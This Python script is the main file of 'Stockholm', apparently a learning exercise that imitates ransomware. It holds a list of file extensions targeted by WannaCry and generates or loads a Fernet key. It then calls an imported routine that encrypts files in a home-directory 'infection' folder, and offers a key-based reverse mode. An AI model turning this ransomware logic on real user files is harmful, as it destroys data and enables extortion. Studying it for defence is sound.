import argparse
import os
from cryptography.fernet import Fernet
from encrypted import start
from decrypted import decrypedFile


header = r"""
  ██████ ▄▄▄█████▓ ▒█████   ▄████▄   ██ ▄█▀ ██░ ██  ▒█████   ██▓     ███▄ ▄███▓
 ▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓██░ ██▒▒██▒  ██▒▓██▒    ▓██▒▀█▀ ██▒
 ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▓███▄░ ▒██▀▀██░▒██░  ██▒▒██░    ▓██    ▓██░
   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ░▓█ ░██ ▒██   ██░▒██░    ▒██    ▒██ 
 ▒██████▒▒  ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄░▓█▒░██▓░ ████▓▒░░██████▒▒██▒   ░██▒
 ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░   ░  ░
 ░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░ ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░ ▒  ░░  ░      ░
 ░  ░  ░    ░      ░ ░ ░ ▒  ░        ░ ░░ ░  ░  ░░ ░░ ░ ░ ▒    ░ ░   ░      ░   
       ░               ░ ░  ░ ░      ░  ░    ░  ░  ░    ░ ░      ░  ░       ░   
                           ░                                                   
"""
WannacryTarget = [
    ".3ds", ".3g2", ".3gp", ".7z", ".ace", ".adb", ".adp", ".ai", ".ani",
    ".apk", ".app", ".appx", ".arc", ".arj", ".asf", ".asp", ".aspx", ".avb",
    ".avi", ".bak", ".bat", ".bf", ".bin", ".bmp", ".bz2", ".cab", ".cbr",
    ".cfa", ".cfg", ".cgi", ".class", ".clp", ".cmx", ".cob", ".com", ".conf",
    ".cpp", ".crt", ".cs", ".css", ".csv", ".dat", ".db", ".dbf", ".dcr",
    ".deb", ".dmg", ".doc", ".docx", ".dot", ".dotx", ".dwg", ".dxf", ".eml",
    ".eps", ".exe", ".fla", ".flv", ".gif", ".gz", ".h", ".html", ".htm", ".ico",
    ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".json", ".key", ".lnk",
    ".log", ".m4a", ".m4v", ".mdb", ".mid", ".midi", ".mkv", ".mov", ".mp3",
    ".mp4", ".mpeg", ".mpg", ".msi", ".msg", ".odt", ".ogg", ".ost", ".otf",
    ".part", ".pas", ".pdf", ".php", ".png", ".pps", ".ppt", ".pptx", ".psd",
    ".rar", ".raw", ".rb", ".rpm", ".rtf", ".sav", ".sln", ".sql", ".swf",
    ".sys", ".tar", ".tif", ".tiff", ".tmp", ".ttf", ".txt", ".vob", ".wav",
    ".wma", ".wmv", ".xls", ".xlsx", ".xml", ".zip"
]


def arg_parse():
    print (header)

    desc = "Stockholm is a Python script designed for testing and \
        gaining a better understanding of how ransomware functions. \
        It encrypts data using the Fernet encryption method and appends \
        the '.ft' extension to all files within the specified folder. This \
        program exclusively operates within a folder named 'infection' located \
        in the user's HOME directory and only encrypts files whose extensions have \
        been targeted by Wannacry."

    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("-v", "--version", action="store_true", help="show the version of the program.")
    parser.add_argument("-r", "--reverse", nargs=1, metavar="<KEY>", help="reverse the infection with the <KEY> entered as argument")
    parser.add_argument("-s", "--silent", action="store_true", help="the program will not produce any output")
    return parser.parse_args()

def getHome(): 
    paths = os.path.expanduser("~")
    try:
        if paths is None:
                raise ValueError("Home path not found.")
        if os.path.isdir(paths) == False:
                raise ValueError("Home not a dir")
    except ValueError as error:
        print(f"Hata: {error}")
    return paths

def infectionFolder(home):
    infection_path = os.path.join(home, "infection")
    if not os.path.exists(infection_path):
        print(f"{infection_path} not found")
        try:
            os.mkdir(infection_path)
        except Exception as e:
            print(f"Error: Could not create directory {infection_path}. Reason: {e}")
    return infection_path

def generate_key():
    key_file_path = "encryption.key"
    
    if os.path.exists(key_file_path):
        with open(key_file_path, 'rb') as key_file:
            key = key_file.read()
            print("Key loaded from file.")
    else:
        key = Fernet.generate_key()
        with open(key_file_path, 'wb') as key_file:
            key_file.write(key)
            print("New key generated and saved to encryption.key.")
    
    return key

def main():
    args = arg_parse() #argümanları pars edip alıyorum
    silent = False
    homePath = getHome() #kullanıcnın home dizininin yolunu alıyorum path varmı yokmu bunun kontrollerini yapıyorum
    if args.version:
       print("version : 0.0.2")
    elif args.reverse:
        key_path = args.reverse[0]
        with open(key_path, "rb") as f:
            key = f.read()
        decrypedFile(homePath, key)
    elif args.silent:
        silent = args.silent
        print("sesiz moda geçti")
        silent = True
    if (not args.version and not args.reverse):
        infectionPath = infectionFolder(homePath) #home dizinine infection adında bir dosya yoksa oluşturuyor
        key = generate_key() #bana bir şifreleme anahtarı oluşturup dosyaya kaydediyor sonradan dosyaya kaydetme işin kaldırabilirim
        start(homePath, silent,WannacryTarget, infectionPath, key)

if __name__ == "__main__":
    main()
